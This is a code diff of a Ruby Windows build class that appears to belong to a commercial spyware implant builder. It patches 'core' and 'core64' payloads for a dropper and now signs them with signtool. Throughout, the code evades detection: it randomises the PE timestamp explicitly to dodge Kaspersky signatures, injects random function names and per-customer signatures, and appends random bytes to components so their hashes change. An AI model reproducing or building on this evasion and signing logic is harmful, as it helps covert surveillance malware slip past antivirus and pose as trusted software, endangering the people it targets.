@@ -38,50 +38,51 @@ class BuildWindows < Build
     # calculate the function name for the dropper
     @funcname = 'F' + Digest::MD5.digest(@factory.logkey).unpack('H*').first[0..4]
 
-    file = File.open(path('core'), 'rb+')
-    content = file.read
-
-    begin
-      content.binary_patch 'PFTBBP', @funcname
-    rescue
-      raise "Funcname marker not found"
+    # patching for the function name
+    patch_file(:file => 'core') do |content|
+      begin
+        content.binary_patch 'PFTBBP', @funcname
+      rescue
+        raise "Funcname marker not found"
+      end
     end
 
-    # avoid signature on the build time (kaspersky)
-    begin
-      offset = content.index("PE\x00\x00")
-      raise "offset is nil" if offset.nil?
-      content.binary_patch_at_offset offset + 8, SecureRandom.random_bytes(4)
-    rescue Exception => e
-      raise "Build time ident marker not found: #{e.message}"
+    # patching the build time (for kaspersky)
+    patch_file(:file => 'core') do |content|
+      begin
+        offset = content.index("PE\x00\x00")
+        raise "offset is nil" if offset.nil?
+        content.binary_patch_at_offset offset + 8, SecureRandom.random_bytes(4)
+      rescue Exception => e
+        raise "Build time ident marker not found: #{e.message}"
+      end
     end
-
-    file.rewind
-    file.write content
-    file.close
 
     # we have an exception here, the core64 must be patched only with the signature and function name
-    file = File.open(path('core64'), 'rb+')
-    content = file.read
+
+    # patching for the function name
+    patch_file(:file => 'core64') do |content|
+      begin
+        content.binary_patch 'PFTBBP', @funcname
+      rescue
+        raise "Funcname marker not found"
+      end
+    end
 
     # per-customer signature
-    begin
-      sign = ::Signature.where({scope: 'agent'}).first
-      signature = Digest::MD5.digest(sign.value) + SecureRandom.random_bytes(16)
-      content.binary_patch 'f7Hk0f5usd04apdvqw13F5ed25soV5eD', signature
-    rescue
-      raise "Signature marker not found"
+    patch_file(:file => 'core64') do |content|
+      begin
+        sign = ::Signature.where({scope: 'agent'}).first
+        signature = Digest::MD5.digest(sign.value) + SecureRandom.random_bytes(16)
+        content.binary_patch 'f7Hk0f5usd04apdvqw13F5ed25soV5eD', signature
+      rescue
+        raise "Signature marker not found"
+      end
     end
 
-    begin
-      content.binary_patch 'PFTBBP', @funcname
-    rescue
-      raise "Funcname marker not found"
-    end
-
-    file.rewind
-    file.write content
-    file.close
+    # signature for the patched code
+    CrossPlatform.exec path('signtool'), "sign /P #{Config.instance.global['CERT_PASSWORD']} /f #{Config.instance.cert("windows.pfx")} #{path('core')}" if to_be_signed?(params)
+    CrossPlatform.exec path('signtool'), "sign /P #{Config.instance.global['CERT_PASSWORD']} /f #{Config.instance.cert("windows.pfx")} #{path('core64')}" if to_be_signed?(params)
 
     # add random bytes to codec, rapi and sqlite
     add_random(path('codec'))
@@ -182,6 +183,16 @@ class BuildWindows < Build
     @outputs = ['output']
   end
 
+  def sign(params)
+    trace :debug, "Build: signing: #{params}"
+
+    # don't sign cooked file (its not a valid PE)
+    return if @cooked
+
+    # perform the signature
+    CrossPlatform.exec path('signtool'), "sign /P #{Config.instance.global['CERT_PASSWORD']} /f #{Config.instance.cert("windows.pfx")} #{path('output')}" if to_be_signed?(params)
+  end
+
   def pack(params)
     trace :debug, "Build: pack: #{params}"
 
@@ -194,8 +205,28 @@ class BuildWindows < Build
 
   end
 
+  private
+
   def add_random(file)
     File.open(file, 'ab+') {|f| f.write SecureRandom.random_bytes(16)}
+  end
+
+  def to_be_signed?(params)
+    # default case
+    do_signature = false
+
+    # not requested but the cert is present
+    if (params.nil? or not params.has_key? 'sign') and File.exist? Config.instance.cert("windows.pfx")
+      do_signature = true
+    end
+
+    # explicit request to sign the code
+    if not params.nil? and params['sign']
+      raise "Cannot find pfx file" unless File.exist? Config.instance.cert("windows.pfx")
+      do_signature = true
+    end
+
+    do_signature
   end
 
 end
